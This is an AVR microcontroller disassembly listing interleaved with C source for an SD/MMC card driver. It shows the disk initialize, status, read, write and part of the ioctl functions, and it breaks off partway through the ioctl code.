    402e:	10 e0       	ldi	r17, 0x00	; 0
    4030:	05 c0       	rjmp	.+10     	; 0x403c <mmc_disk_initialize+0x15c>
    4032:	18 e0       	ldi	r17, 0x08	; 8
    4034:	03 c0       	rjmp	.+6      	; 0x403c <mmc_disk_initialize+0x15c>
    4036:	10 e0       	ldi	r17, 0x00	; 0
    4038:	01 c0       	rjmp	.+2      	; 0x403c <mmc_disk_initialize+0x15c>
    403a:	10 e0       	ldi	r17, 0x00	; 0
    403c:	10 93 5d 09 	sts	0x095D, r17	; 0x80095d <CardType>
    4040:	a9 de       	rcall	.-686    	; 0x3d94 <deselect>
    4042:	11 23       	and	r17, r17
    4044:	41 f0       	breq	.+16     	; 0x4056 <mmc_disk_initialize+0x176>
    4046:	80 91 57 01 	lds	r24, 0x0157	; 0x800157 <Stat>
    404a:	8e 7f       	andi	r24, 0xFE	; 254
    404c:	80 93 57 01 	sts	0x0157, r24	; 0x800157 <Stat>
    4050:	80 e5       	ldi	r24, 0x50	; 80
    4052:	8c bd       	out	0x2c, r24	; 44
    4054:	01 c0       	rjmp	.+2      	; 0x4058 <mmc_disk_initialize+0x178>
    4056:	40 de       	rcall	.-896    	; 0x3cd8 <power_off>
    4058:	80 91 57 01 	lds	r24, 0x0157	; 0x800157 <Stat>
    405c:	0f 90       	pop	r0
    405e:	0f 90       	pop	r0
    4060:	0f 90       	pop	r0
    4062:	0f 90       	pop	r0
    4064:	df 91       	pop	r29
    4066:	cf 91       	pop	r28
    4068:	1f 91       	pop	r17
    406a:	0f 91       	pop	r16
    406c:	ff 90       	pop	r15
    406e:	ef 90       	pop	r14
    4070:	08 95       	ret

00004072 <mmc_disk_status>:
    4072:	80 91 57 01 	lds	r24, 0x0157	; 0x800157 <Stat>
    4076:	08 95       	ret

00004078 <mmc_disk_read>:
    4078:	ff 92       	push	r15
    407a:	0f 93       	push	r16
    407c:	1f 93       	push	r17
    407e:	cf 93       	push	r28
    4080:	df 93       	push	r29
    4082:	8c 01       	movw	r16, r24
    4084:	e9 01       	movw	r28, r18
    4086:	20 97       	sbiw	r28, 0x00	; 0
    4088:	c1 f1       	breq	.+112    	; 0x40fa <mmc_disk_read+0x82>
    408a:	80 91 57 01 	lds	r24, 0x0157	; 0x800157 <Stat>
    408e:	80 fd       	sbrc	r24, 0
    4090:	36 c0       	rjmp	.+108    	; 0x40fe <mmc_disk_read+0x86>
    4092:	80 91 5d 09 	lds	r24, 0x095D	; 0x80095d <CardType>
    4096:	84 fd       	sbrc	r24, 4
    4098:	09 c0       	rjmp	.+18     	; 0x40ac <mmc_disk_read+0x34>
    409a:	03 2e       	mov	r0, r19
    409c:	39 e0       	ldi	r19, 0x09	; 9
    409e:	44 0f       	add	r20, r20
    40a0:	55 1f       	adc	r21, r21
    40a2:	66 1f       	adc	r22, r22
    40a4:	77 1f       	adc	r23, r23
    40a6:	3a 95       	dec	r19
    40a8:	d1 f7       	brne	.-12     	; 0x409e <mmc_disk_read+0x26>
    40aa:	30 2d       	mov	r19, r0
    40ac:	c2 30       	cpi	r28, 0x02	; 2
    40ae:	d1 05       	cpc	r29, r1
    40b0:	28 f0       	brcs	.+10     	; 0x40bc <mmc_disk_read+0x44>
    40b2:	0f 2e       	mov	r0, r31
    40b4:	f2 e1       	ldi	r31, 0x12	; 18
    40b6:	ff 2e       	mov	r15, r31
    40b8:	f0 2d       	mov	r31, r0
    40ba:	04 c0       	rjmp	.+8      	; 0x40c4 <mmc_disk_read+0x4c>
    40bc:	0f 2e       	mov	r0, r31
    40be:	f1 e1       	ldi	r31, 0x11	; 17
    40c0:	ff 2e       	mov	r15, r31
    40c2:	f0 2d       	mov	r31, r0
    40c4:	8f 2d       	mov	r24, r15
    40c6:	cb de       	rcall	.-618    	; 0x3e5e <send_cmd>
    40c8:	81 11       	cpse	r24, r1
    40ca:	11 c0       	rjmp	.+34     	; 0x40ee <mmc_disk_read+0x76>
    40cc:	60 e0       	ldi	r22, 0x00	; 0
    40ce:	72 e0       	ldi	r23, 0x02	; 2
    40d0:	c8 01       	movw	r24, r16
    40d2:	7b de       	rcall	.-778    	; 0x3dca <rcvr_datablock>
    40d4:	89 2b       	or	r24, r25
    40d6:	19 f0       	breq	.+6      	; 0x40de <mmc_disk_read+0x66>
    40d8:	1e 5f       	subi	r17, 0xFE	; 254
    40da:	21 97       	sbiw	r28, 0x01	; 1
    40dc:	b9 f7       	brne	.-18     	; 0x40cc <mmc_disk_read+0x54>
    40de:	82 e1       	ldi	r24, 0x12	; 18
    40e0:	f8 12       	cpse	r15, r24
    40e2:	05 c0       	rjmp	.+10     	; 0x40ee <mmc_disk_read+0x76>
    40e4:	40 e0       	ldi	r20, 0x00	; 0
    40e6:	50 e0       	ldi	r21, 0x00	; 0
    40e8:	ba 01       	movw	r22, r20
    40ea:	8c e0       	ldi	r24, 0x0C	; 12
    40ec:	b8 de       	rcall	.-656    	; 0x3e5e <send_cmd>
    40ee:	52 de       	rcall	.-860    	; 0x3d94 <deselect>
    40f0:	81 e0       	ldi	r24, 0x01	; 1
    40f2:	cd 2b       	or	r28, r29
    40f4:	29 f4       	brne	.+10     	; 0x4100 <mmc_disk_read+0x88>
    40f6:	80 e0       	ldi	r24, 0x00	; 0
    40f8:	03 c0       	rjmp	.+6      	; 0x4100 <mmc_disk_read+0x88>
    40fa:	84 e0       	ldi	r24, 0x04	; 4
    40fc:	01 c0       	rjmp	.+2      	; 0x4100 <mmc_disk_read+0x88>
    40fe:	83 e0       	ldi	r24, 0x03	; 3
    4100:	df 91       	pop	r29
    4102:	cf 91       	pop	r28
    4104:	1f 91       	pop	r17
    4106:	0f 91       	pop	r16
    4108:	ff 90       	pop	r15
    410a:	08 95       	ret

0000410c <mmc_disk_write>:
DRESULT mmc_disk_write (
    const BYTE* buff,   /* Pointer to the data to be written */
    LBA_t sector,       /* Start sector number (LBA) */
    UINT count          /* Sector count (1..128) */
)
{
    410c:	cf 92       	push	r12
    410e:	df 92       	push	r13
    4110:	ef 92       	push	r14
    4112:	ff 92       	push	r15
    4114:	0f 93       	push	r16
    4116:	1f 93       	push	r17
    4118:	cf 93       	push	r28
    411a:	df 93       	push	r29
    411c:	8c 01       	movw	r16, r24
    411e:	6a 01       	movw	r12, r20
    4120:	7b 01       	movw	r14, r22
    4122:	e9 01       	movw	r28, r18
    DWORD sect = (DWORD)sector;


    if (!count)
    4124:	20 97       	sbiw	r28, 0x00	; 0
    4126:	09 f4       	brne	.+2      	; 0x412a <mmc_disk_write+0x1e>
    4128:	4b c0       	rjmp	.+150    	; 0x41c0 <mmc_disk_write+0xb4>
    {
        return RES_PARERR;
    }
    if (Stat & STA_NOINIT)
    412a:	80 91 57 01 	lds	r24, 0x0157	; 0x800157 <Stat>
    412e:	80 fd       	sbrc	r24, 0
    4130:	49 c0       	rjmp	.+146    	; 0x41c4 <mmc_disk_write+0xb8>
    {
        return RES_NOTRDY;
    }
    if (Stat & STA_PROTECT)
    4132:	80 91 57 01 	lds	r24, 0x0157	; 0x800157 <Stat>
    4136:	82 fd       	sbrc	r24, 2
    4138:	47 c0       	rjmp	.+142    	; 0x41c8 <mmc_disk_write+0xbc>
    {
        return RES_WRPRT;
    }

    if (!(CardType & CT_BLOCK))
    413a:	80 91 5d 09 	lds	r24, 0x095D	; 0x80095d <CardType>
    413e:	84 fd       	sbrc	r24, 4
    4140:	09 c0       	rjmp	.+18     	; 0x4154 <mmc_disk_write+0x48>
    {
        sect *= 512;    /* Convert to byte address if needed */
    4142:	0b 2e       	mov	r0, r27
    4144:	b9 e0       	ldi	r27, 0x09	; 9
    4146:	cc 0c       	add	r12, r12
    4148:	dd 1c       	adc	r13, r13
    414a:	ee 1c       	adc	r14, r14
    414c:	ff 1c       	adc	r15, r15
    414e:	ba 95       	dec	r27
    4150:	d1 f7       	brne	.-12     	; 0x4146 <mmc_disk_write+0x3a>
    4152:	b0 2d       	mov	r27, r0
    }

    if (count == 1)     /* Single block write */
    4154:	c1 30       	cpi	r28, 0x01	; 1
    4156:	d1 05       	cpc	r29, r1
    4158:	61 f4       	brne	.+24     	; 0x4172 <mmc_disk_write+0x66>
    {
        if ((send_cmd(CMD24, sect) == 0)    /* WRITE_BLOCK */
    415a:	b7 01       	movw	r22, r14
    415c:	a6 01       	movw	r20, r12
    415e:	88 e1       	ldi	r24, 0x18	; 24
    4160:	7e de       	rcall	.-772    	; 0x3e5e <send_cmd>
    4162:	81 11       	cpse	r24, r1
    4164:	27 c0       	rjmp	.+78     	; 0x41b4 <mmc_disk_write+0xa8>
                && xmit_datablock(buff, 0xFE))
    4166:	6e ef       	ldi	r22, 0xFE	; 254
    4168:	c8 01       	movw	r24, r16
    416a:	53 de       	rcall	.-858    	; 0x3e12 <xmit_datablock>
    416c:	89 2b       	or	r24, r25
    416e:	e9 f4       	brne	.+58     	; 0x41aa <mmc_disk_write+0x9e>
    4170:	21 c0       	rjmp	.+66     	; 0x41b4 <mmc_disk_write+0xa8>
            count = 0;
        }
    }
    else                /* Multiple block write */
    {
        if (CardType & CT_SDC)
    4172:	8c 70       	andi	r24, 0x0C	; 12
    4174:	29 f0       	breq	.+10     	; 0x4180 <mmc_disk_write+0x74>
        {
            send_cmd(ACMD23, count);
    4176:	ae 01       	movw	r20, r28
    4178:	60 e0       	ldi	r22, 0x00	; 0
    417a:	70 e0       	ldi	r23, 0x00	; 0
    417c:	87 e9       	ldi	r24, 0x97	; 151
    417e:	6f de       	rcall	.-802    	; 0x3e5e <send_cmd>
        }
        if (send_cmd(CMD25, sect) == 0)     /* WRITE_MULTIPLE_BLOCK */
    4180:	b7 01       	movw	r22, r14
    4182:	a6 01       	movw	r20, r12
    4184:	89 e1       	ldi	r24, 0x19	; 25
    4186:	6b de       	rcall	.-810    	; 0x3e5e <send_cmd>
    4188:	81 11       	cpse	r24, r1
        {
            do
            {
                if (!xmit_datablock(buff, 0xFC))
    418a:	14 c0       	rjmp	.+40     	; 0x41b4 <mmc_disk_write+0xa8>
    418c:	6c ef       	ldi	r22, 0xFC	; 252
    418e:	c8 01       	movw	r24, r16
    4190:	40 de       	rcall	.-896    	; 0x3e12 <xmit_datablock>
    4192:	89 2b       	or	r24, r25
    4194:	19 f0       	breq	.+6      	; 0x419c <mmc_disk_write+0x90>
                {
                    break;
                }
                buff += 512;
    4196:	1e 5f       	subi	r17, 0xFE	; 254
            } while (--count);
    4198:	21 97       	sbiw	r28, 0x01	; 1
            if (!xmit_datablock(0, 0xFD))
    419a:	c1 f7       	brne	.-16     	; 0x418c <mmc_disk_write+0x80>
    419c:	6d ef       	ldi	r22, 0xFD	; 253
    419e:	80 e0       	ldi	r24, 0x00	; 0
    41a0:	90 e0       	ldi	r25, 0x00	; 0
    41a2:	37 de       	rcall	.-914    	; 0x3e12 <xmit_datablock>
    41a4:	89 2b       	or	r24, r25
    41a6:	21 f0       	breq	.+8      	; 0x41b0 <mmc_disk_write+0xa4>
    if (count == 1)     /* Single block write */
    {
        if ((send_cmd(CMD24, sect) == 0)    /* WRITE_BLOCK */
                && xmit_datablock(buff, 0xFE))
        {
            count = 0;
    41a8:	05 c0       	rjmp	.+10     	; 0x41b4 <mmc_disk_write+0xa8>
    41aa:	c0 e0       	ldi	r28, 0x00	; 0
    41ac:	d0 e0       	ldi	r29, 0x00	; 0
                }
                buff += 512;
            } while (--count);
            if (!xmit_datablock(0, 0xFD))
            {
                count = 1;    /* STOP_TRAN token */
    41ae:	02 c0       	rjmp	.+4      	; 0x41b4 <mmc_disk_write+0xa8>
    41b0:	c1 e0       	ldi	r28, 0x01	; 1
            }
        }
    }
    deselect();
    41b2:	d0 e0       	ldi	r29, 0x00	; 0
    41b4:	ef dd       	rcall	.-1058   	; 0x3d94 <deselect>

    return count ? RES_ERROR : RES_OK;
    41b6:	81 e0       	ldi	r24, 0x01	; 1
    41b8:	cd 2b       	or	r28, r29
    41ba:	39 f4       	brne	.+14     	; 0x41ca <mmc_disk_write+0xbe>
    41bc:	80 e0       	ldi	r24, 0x00	; 0
    41be:	05 c0       	rjmp	.+10     	; 0x41ca <mmc_disk_write+0xbe>
    DWORD sect = (DWORD)sector;


    if (!count)
    {
        return RES_PARERR;
    41c0:	84 e0       	ldi	r24, 0x04	; 4
    41c2:	03 c0       	rjmp	.+6      	; 0x41ca <mmc_disk_write+0xbe>
    }
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    41c4:	83 e0       	ldi	r24, 0x03	; 3
    41c6:	01 c0       	rjmp	.+2      	; 0x41ca <mmc_disk_write+0xbe>
    }
    if (Stat & STA_PROTECT)
    {
        return RES_WRPRT;
    41c8:	82 e0       	ldi	r24, 0x02	; 2
        }
    }
    deselect();

    return count ? RES_ERROR : RES_OK;
}
    41ca:	df 91       	pop	r29
    41cc:	cf 91       	pop	r28
    41ce:	1f 91       	pop	r17
    41d0:	0f 91       	pop	r16
    41d2:	ff 90       	pop	r15
    41d4:	ef 90       	pop	r14
    41d6:	df 90       	pop	r13
    41d8:	cf 90       	pop	r12
    41da:	08 95       	ret

000041dc <mmc_disk_ioctl>:
#if _USE_IOCTL
DRESULT mmc_disk_ioctl (
    BYTE cmd,       /* Control code */
    void* buff      /* Buffer to send/receive control data */
)
{
    41dc:	af 92       	push	r10
    41de:	bf 92       	push	r11
    41e0:	cf 92       	push	r12
    41e2:	df 92       	push	r13
    41e4:	ef 92       	push	r14
    41e6:	ff 92       	push	r15
    41e8:	0f 93       	push	r16
    41ea:	1f 93       	push	r17
    41ec:	cf 93       	push	r28
    41ee:	df 93       	push	r29
    41f0:	cd b7       	in	r28, 0x3d	; 61
    41f2:	de b7       	in	r29, 0x3e	; 62
    41f4:	60 97       	sbiw	r28, 0x10	; 16
    41f6:	0f b6       	in	r0, 0x3f	; 63
    41f8:	f8 94       	cli
    41fa:	de bf       	out	0x3e, r29	; 62
    41fc:	0f be       	out	0x3f, r0	; 63
    41fe:	cd bf       	out	0x3d, r28	; 61
    4200:	8b 01       	movw	r16, r22
    SDIO_CTRL* sdi;
    BYTE rc, *bp;
    UINT dc;
#endif

    if (Stat & STA_NOINIT)
    4202:	90 91 57 01 	lds	r25, 0x0157	; 0x800157 <Stat>
    4206:	90 fd       	sbrc	r25, 0
    4208:	d2 c2       	rjmp	.+1444   	; 0x47ae <mmc_disk_ioctl+0x5d2>
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    switch (cmd)
    420a:	83 33       	cpi	r24, 0x33	; 51
    420c:	09 f4       	brne	.+2      	; 0x4210 <mmc_disk_ioctl+0x34>
    420e:	47 c1       	rjmp	.+654    	; 0x449e <mmc_disk_ioctl+0x2c2>
    4210:	80 f4       	brcc	.+32     	; 0x4232 <mmc_disk_ioctl+0x56>
    4212:	83 30       	cpi	r24, 0x03	; 3
    4214:	09 f4       	brne	.+2      	; 0x4218 <mmc_disk_ioctl+0x3c>
    4216:	a4 c0       	rjmp	.+328    	; 0x4360 <mmc_disk_ioctl+0x184>
    4218:	28 f4       	brcc	.+10     	; 0x4224 <mmc_disk_ioctl+0x48>
    421a:	88 23       	and	r24, r24
    421c:	f1 f0       	breq	.+60     	; 0x425a <mmc_disk_ioctl+0x7e>
    421e:	81 30       	cpi	r24, 0x01	; 1
    4220:	29 f1       	breq	.+74     	; 0x426c <mmc_disk_ioctl+0x90>
    4222:	c7 c2       	rjmp	.+1422   	; 0x47b2 <mmc_disk_ioctl+0x5d6>
    4224:	87 30       	cpi	r24, 0x07	; 7
    4226:	09 f4       	brne	.+2      	; 0x422a <mmc_disk_ioctl+0x4e>
    4228:	98 c1       	rjmp	.+816    	; 0x455a <mmc_disk_ioctl+0x37e>
    422a:	82 33       	cpi	r24, 0x32	; 50
    422c:	09 f4       	brne	.+2      	; 0x4230 <mmc_disk_ioctl+0x54>
    422e:	31 c1       	rjmp	.+610    	; 0x4492 <mmc_disk_ioctl+0x2b6>
    4230:	c0 c2       	rjmp	.+1408   	; 0x47b2 <mmc_disk_ioctl+0x5d6>
    4232:	86 33       	cpi	r24, 0x36	; 54
    4234:	09 f4       	brne	.+2      	; 0x4238 <mmc_disk_ioctl+0x5c>
    4236:	7a c1       	rjmp	.+756    	; 0x452c <mmc_disk_ioctl+0x350>
    4238:	38 f4       	brcc	.+14     	; 0x4248 <mmc_disk_ioctl+0x6c>
    423a:	84 33       	cpi	r24, 0x34	; 52
    423c:	09 f4       	brne	.+2      	; 0x4240 <mmc_disk_ioctl+0x64>
    423e:	44 c1       	rjmp	.+648    	; 0x44c8 <mmc_disk_ioctl+0x2ec>
    4240:	85 33       	cpi	r24, 0x35	; 53
    4242:	09 f4       	brne	.+2      	; 0x4246 <mmc_disk_ioctl+0x6a>
    4244:	56 c1       	rjmp	.+684    	; 0x44f2 <mmc_disk_ioctl+0x316>
    4246:	b5 c2       	rjmp	.+1386   	; 0x47b2 <mmc_disk_ioctl+0x5d6>
    4248:	88 33       	cpi	r24, 0x38	; 56
    424a:	09 f4       	brne	.+2      	; 0x424e <mmc_disk_ioctl+0x72>
    424c:	fe c1       	rjmp	.+1020   	; 0x464a <mmc_disk_ioctl+0x46e>
    424e:	08 f4       	brcc	.+2      	; 0x4252 <mmc_disk_ioctl+0x76>
    4250:	8c c1       	rjmp	.+792    	; 0x456a <mmc_disk_ioctl+0x38e>
    4252:	89 33       	cpi	r24, 0x39	; 57
    4254:	09 f4       	brne	.+2      	; 0x4258 <mmc_disk_ioctl+0x7c>
    4256:	60 c2       	rjmp	.+1216   	; 0x4718 <mmc_disk_ioctl+0x53c>
    4258:	ac c2       	rjmp	.+1368   	; 0x47b2 <mmc_disk_ioctl+0x5d6>
    {
        case CTRL_SYNC :        /* Make sure that no pending write process. Do not remove this or written sector might not left updated. */
            if (select())
    425a:	a2 dd       	rcall	.-1212   	; 0x3da0 <select>
    425c:	89 2b       	or	r24, r25
    425e:	11 f4       	brne	.+4      	; 0x4264 <mmc_disk_ioctl+0x88>
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    4260:	11 e0       	ldi	r17, 0x01	; 1
    4262:	01 c0       	rjmp	.+2      	; 0x4266 <mmc_disk_ioctl+0x8a>
        case CTRL_SYNC :        /* Make sure that no pending write process. Do not remove this or written sector might not left updated. */
            if (select())
            {
                res = RES_OK;
            }
            deselect();
    4264:	10 e0       	ldi	r17, 0x00	; 0
    4266:	96 dd       	rcall	.-1236   	; 0x3d94 <deselect>
            break;
    4268:	81 2f       	mov	r24, r17
    426a:	a4 c2       	rjmp	.+1352   	; 0x47b4 <mmc_disk_ioctl+0x5d8>

        case GET_SECTOR_COUNT : /* Get number of sectors on the disk (DWORD) */
            if ((send_cmd(CMD9, 0) == 0) && rcvr_datablock(csd, 16))
    426c:	40 e0       	ldi	r20, 0x00	; 0
    426e:	50 e0       	ldi	r21, 0x00	; 0
    4270:	ba 01       	movw	r22, r20
    4272:	89 e0       	ldi	r24, 0x09	; 9
    4274:	f4 dd       	rcall	.-1048   	; 0x3e5e <send_cmd>
    4276:	81 11       	cpse	r24, r1
    4278:	6d c0       	rjmp	.+218    	; 0x4354 <mmc_disk_ioctl+0x178>
    427a:	60 e1       	ldi	r22, 0x10	; 16
    427c:	70 e0       	ldi	r23, 0x00	; 0
    427e:	ce 01       	movw	r24, r28
    4280:	01 96       	adiw	r24, 0x01	; 1
    4282:	a3 dd       	rcall	.-1210   	; 0x3dca <rcvr_datablock>
    4284:	89 2b       	or	r24, r25
    4286:	09 f4       	brne	.+2      	; 0x428a <mmc_disk_ioctl+0xae>
    4288:	67 c0       	rjmp	.+206    	; 0x4358 <mmc_disk_ioctl+0x17c>
            {
                if ((csd[0] >> 6) == 1)     /* SDC ver 2.00 */
    428a:	89 81       	ldd	r24, Y+1	; 0x01
    428c:	82 95       	swap	r24
    428e:	86 95       	lsr	r24
    4290:	86 95       	lsr	r24
    4292:	83 70       	andi	r24, 0x03	; 3
    4294:	81 30       	cpi	r24, 0x01	; 1
    4296:	31 f5       	brne	.+76     	; 0x42e4 <mmc_disk_ioctl+0x108>
                {
                    csize = csd[9] + ((WORD)csd[8] << 8) + ((DWORD)(csd[7] & 63) << 16) + 1;
    4298:	8a 85       	ldd	r24, Y+10	; 0x0a
    429a:	29 85       	ldd	r18, Y+9	; 0x09
    429c:	30 e0       	ldi	r19, 0x00	; 0
    429e:	32 2f       	mov	r19, r18
    42a0:	22 27       	eor	r18, r18
    42a2:	28 0f       	add	r18, r24
    42a4:	31 1d       	adc	r19, r1
    42a6:	88 85       	ldd	r24, Y+8	; 0x08
    42a8:	8f 73       	andi	r24, 0x3F	; 63
    42aa:	90 e0       	ldi	r25, 0x00	; 0
    42ac:	a0 e0       	ldi	r26, 0x00	; 0
    42ae:	b0 e0       	ldi	r27, 0x00	; 0
    42b0:	dc 01       	movw	r26, r24
    42b2:	99 27       	eor	r25, r25
    42b4:	88 27       	eor	r24, r24
    42b6:	82 0f       	add	r24, r18
    42b8:	93 1f       	adc	r25, r19
    42ba:	a1 1d       	adc	r26, r1
    42bc:	b1 1d       	adc	r27, r1
    42be:	01 96       	adiw	r24, 0x01	; 1
    42c0:	a1 1d       	adc	r26, r1
    42c2:	b1 1d       	adc	r27, r1
                    *(LBA_t*)buff = csize << 10;
    42c4:	07 2e       	mov	r0, r23
    42c6:	7a e0       	ldi	r23, 0x0A	; 10
    42c8:	88 0f       	add	r24, r24
    42ca:	99 1f       	adc	r25, r25
    42cc:	aa 1f       	adc	r26, r26
    42ce:	bb 1f       	adc	r27, r27
    42d0:	7a 95       	dec	r23
    42d2:	d1 f7       	brne	.-12     	; 0x42c8 <mmc_disk_ioctl+0xec>
    42d4:	70 2d       	mov	r23, r0
    42d6:	f8 01       	movw	r30, r16
    42d8:	80 83       	st	Z, r24
    42da:	91 83       	std	Z+1, r25	; 0x01
    42dc:	a2 83       	std	Z+2, r26	; 0x02
    42de:	b3 83       	std	Z+3, r27	; 0x03
                {
                    n = (csd[5] & 15) + ((csd[10] & 128) >> 7) + ((csd[9] & 3) << 1) + 2;
                    csize = (csd[8] >> 6) + ((WORD)csd[7] << 2) + ((WORD)(csd[6] & 3) << 10) + 1;
                    *(LBA_t*)buff = csize << (n - 9);
                }
                res = RES_OK;
    42e0:	10 e0       	ldi	r17, 0x00	; 0
    42e2:	3b c0       	rjmp	.+118    	; 0x435a <mmc_disk_ioctl+0x17e>
                    csize = csd[9] + ((WORD)csd[8] << 8) + ((DWORD)(csd[7] & 63) << 16) + 1;
                    *(LBA_t*)buff = csize << 10;
                }
                else                        /* SDC ver 1.XX or MMC*/
                {
                    n = (csd[5] & 15) + ((csd[10] & 128) >> 7) + ((csd[9] & 3) << 1) + 2;
    42e4:	2e 81       	ldd	r18, Y+6	; 0x06
    42e6:	9b 85       	ldd	r25, Y+11	; 0x0b
    42e8:	99 1f       	adc	r25, r25
    42ea:	99 27       	eor	r25, r25
    42ec:	99 1f       	adc	r25, r25
    42ee:	8a 85       	ldd	r24, Y+10	; 0x0a
    42f0:	2f 70       	andi	r18, 0x0F	; 15
    42f2:	29 0f       	add	r18, r25
    42f4:	83 70       	andi	r24, 0x03	; 3
    42f6:	88 0f       	add	r24, r24
    42f8:	28 0f       	add	r18, r24
    42fa:	2e 5f       	subi	r18, 0xFE	; 254
                    csize = (csd[8] >> 6) + ((WORD)csd[7] << 2) + ((WORD)(csd[6] & 3) << 10) + 1;
    42fc:	39 85       	ldd	r19, Y+9	; 0x09
    42fe:	88 85       	ldd	r24, Y+8	; 0x08
    4300:	90 e0       	ldi	r25, 0x00	; 0
    4302:	88 0f       	add	r24, r24
    4304:	99 1f       	adc	r25, r25
    4306:	88 0f       	add	r24, r24
    4308:	99 1f       	adc	r25, r25
    430a:	32 95       	swap	r19
    430c:	36 95       	lsr	r19
    430e:	36 95       	lsr	r19
    4310:	33 70       	andi	r19, 0x03	; 3
    4312:	ac 01       	movw	r20, r24
    4314:	43 0f       	add	r20, r19
    4316:	51 1d       	adc	r21, r1
    4318:	9f 81       	ldd	r25, Y+7	; 0x07
    431a:	93 70       	andi	r25, 0x03	; 3
    431c:	89 2f       	mov	r24, r25
    431e:	90 e0       	ldi	r25, 0x00	; 0
    4320:	98 2f       	mov	r25, r24
    4322:	88 27       	eor	r24, r24
    4324:	99 0f       	add	r25, r25
    4326:	99 0f       	add	r25, r25
    4328:	84 0f       	add	r24, r20
    432a:	95 1f       	adc	r25, r21
    432c:	01 96       	adiw	r24, 0x01	; 1
    432e:	a0 e0       	ldi	r26, 0x00	; 0
    4330:	b0 e0       	ldi	r27, 0x00	; 0
                    *(LBA_t*)buff = csize << (n - 9);
    4332:	30 e0       	ldi	r19, 0x00	; 0
    4334:	29 50       	subi	r18, 0x09	; 9
    4336:	31 09       	sbc	r19, r1
    4338:	04 c0       	rjmp	.+8      	; 0x4342 <mmc_disk_ioctl+0x166>
    433a:	88 0f       	add	r24, r24
    433c:	99 1f       	adc	r25, r25
    433e:	aa 1f       	adc	r26, r26
    4340:	bb 1f       	adc	r27, r27
    4342:	2a 95       	dec	r18
    4344:	d2 f7       	brpl	.-12     	; 0x433a <mmc_disk_ioctl+0x15e>
    4346:	f8 01       	movw	r30, r16
    4348:	80 83       	st	Z, r24
    434a:	91 83       	std	Z+1, r25	; 0x01
    434c:	a2 83       	std	Z+2, r26	; 0x02
    434e:	b3 83       	std	Z+3, r27	; 0x03
                }
                res = RES_OK;
    4350:	10 e0       	ldi	r17, 0x00	; 0
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    4352:	03 c0       	rjmp	.+6      	; 0x435a <mmc_disk_ioctl+0x17e>
    4354:	11 e0       	ldi	r17, 0x01	; 1
    4356:	01 c0       	rjmp	.+2      	; 0x435a <mmc_disk_ioctl+0x17e>
                    csize = (csd[8] >> 6) + ((WORD)csd[7] << 2) + ((WORD)(csd[6] & 3) << 10) + 1;
                    *(LBA_t*)buff = csize << (n - 9);
                }
                res = RES_OK;
            }
            deselect();
    4358:	11 e0       	ldi	r17, 0x01	; 1
    435a:	1c dd       	rcall	.-1480   	; 0x3d94 <deselect>
            break;
    435c:	81 2f       	mov	r24, r17
    435e:	2a c2       	rjmp	.+1108   	; 0x47b4 <mmc_disk_ioctl+0x5d8>

        case GET_BLOCK_SIZE :   /* Get erase block size in unit of sector (DWORD) */
            if (CardType & CT_SDC2)     /* SDv2? */
    4360:	80 91 5d 09 	lds	r24, 0x095D	; 0x80095d <CardType>
    4364:	83 ff       	sbrs	r24, 3
            {
                if (send_cmd(ACMD13, 0) == 0)   /* Read SD status */
    4366:	31 c0       	rjmp	.+98     	; 0x43ca <mmc_disk_ioctl+0x1ee>
    4368:	40 e0       	ldi	r20, 0x00	; 0
    436a:	50 e0       	ldi	r21, 0x00	; 0
    436c:	ba 01       	movw	r22, r20
    436e:	8d e8       	ldi	r24, 0x8D	; 141
    4370:	76 dd       	rcall	.-1300   	; 0x3e5e <send_cmd>
    4372:	81 11       	cpse	r24, r1
                {
                    xchg_spi(0xFF);
    4374:	86 c0       	rjmp	.+268    	; 0x4482 <mmc_disk_ioctl+0x2a6>
    4376:	8f ef       	ldi	r24, 0xFF	; 255
                    if (rcvr_datablock(csd, 16))                /* Read partial block */
    4378:	b7 dc       	rcall	.-1682   	; 0x3ce8 <xchg_spi>
    437a:	60 e1       	ldi	r22, 0x10	; 16
    437c:	70 e0       	ldi	r23, 0x00	; 0
    437e:	ce 01       	movw	r24, r28
    4380:	01 96       	adiw	r24, 0x01	; 1
    4382:	23 dd       	rcall	.-1466   	; 0x3dca <rcvr_datablock>
    4384:	89 2b       	or	r24, r25
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    4386:	31 f4       	brne	.+12     	; 0x4394 <mmc_disk_ioctl+0x1b8>
    4388:	11 e0       	ldi	r17, 0x01	; 1
                    xchg_spi(0xFF);
                    if (rcvr_datablock(csd, 16))                /* Read partial block */
                    {
                        for (n = 64 - 16; n; n--)
                        {
                            xchg_spi(0xFF);    /* Purge trailing data */
    438a:	80 c0       	rjmp	.+256    	; 0x448c <mmc_disk_ioctl+0x2b0>
    438c:	8f ef       	ldi	r24, 0xFF	; 255
    438e:	ac dc       	rcall	.-1704   	; 0x3ce8 <xchg_spi>
                if (send_cmd(ACMD13, 0) == 0)   /* Read SD status */
                {
                    xchg_spi(0xFF);
                    if (rcvr_datablock(csd, 16))                /* Read partial block */
                    {
                        for (n = 64 - 16; n; n--)
    4390:	fa 94       	dec	r15
    4392:	04 c0       	rjmp	.+8      	; 0x439c <mmc_disk_ioctl+0x1c0>
    4394:	0f 2e       	mov	r0, r31
    4396:	f0 e3       	ldi	r31, 0x30	; 48
    4398:	ff 2e       	mov	r15, r31
    439a:	f0 2d       	mov	r31, r0
    439c:	f1 10       	cpse	r15, r1
    439e:	f6 cf       	rjmp	.-20     	; 0x438c <mmc_disk_ioctl+0x1b0>
                        {
                            xchg_spi(0xFF);    /* Purge trailing data */
                        }
                        *(DWORD*)buff = 16UL << (csd[10] >> 4);
    43a0:	2b 85       	ldd	r18, Y+11	; 0x0b
    43a2:	22 95       	swap	r18
    43a4:	2f 70       	andi	r18, 0x0F	; 15
    43a6:	80 e1       	ldi	r24, 0x10	; 16
    43a8:	90 e0       	ldi	r25, 0x00	; 0
    43aa:	a0 e0       	ldi	r26, 0x00	; 0
    43ac:	b0 e0       	ldi	r27, 0x00	; 0
    43ae:	04 c0       	rjmp	.+8      	; 0x43b8 <mmc_disk_ioctl+0x1dc>
    43b0:	88 0f       	add	r24, r24
    43b2:	99 1f       	adc	r25, r25
    43b4:	aa 1f       	adc	r26, r26
    43b6:	bb 1f       	adc	r27, r27
    43b8:	2a 95       	dec	r18
